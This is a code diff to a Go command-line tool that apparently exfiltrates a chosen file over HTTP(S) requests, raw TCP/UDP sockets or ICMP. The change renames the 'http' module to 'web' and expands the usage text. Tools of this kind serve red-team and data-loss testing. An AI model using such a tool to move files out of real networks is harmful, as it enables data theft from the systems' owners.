@@ -21,10 +21,10 @@ func usage() {
 	fmt.Printf("Usage: %s [options] \n\n", filename)
 	flag.PrintDefaults()
 	fmt.Println("\nEach module is different but should be created similar to the following:")
-	fmt.Println("\tHTTP\t[module,method,host]")
-	fmt.Println("\t\tEx. http,get,http://example.com:8080/status")
-	fmt.Println("\t\tEx. http,post,http://192.168.1.1/upload")
-	fmt.Println("\n\tSocket\t[module,method,host:port]")
+	fmt.Println("\tWEB\tUploads file via http(s) POST or multiple GET requests [module,method,host]")
+	fmt.Println("\t\tEx. web,get,http://example.com:8080/status")
+	fmt.Println("\t\tEx. web,post,https://192.168.1.1/upload")
+	fmt.Println("\n\tSocket\tUploads file via raw TCP or UDP packets [module,method,host:port]")
 	fmt.Println("\t\tEx. socket,tcp,192.168.1.1:8080")
 	fmt.Println("\t\tEx. socket,udp,192.168.1.1:8888")
 }
@@ -47,7 +47,7 @@ func isValidFile(file string) bool {
 func main() {
 	flag.Usage = usage
 
-	module := flag.String("module", "", "Specify module [HTTP|ICMP|SOCKET]")
+	module := flag.String("module", "", "Specify module [WEB|ICMP|SOCKET]")
 	file := flag.String("file", "", "File you want to send")
 	flag.Parse()
 
@@ -74,7 +74,7 @@ func main() {
 	}
 
 	// Make sure a valid module is specified
-	if mod == "http" {
+	if mod == "web" {
 		http.HttpRun(data, *file)
 	} else if mod == "icmp" {
 		fmt.Println("Exfil via ICMP")
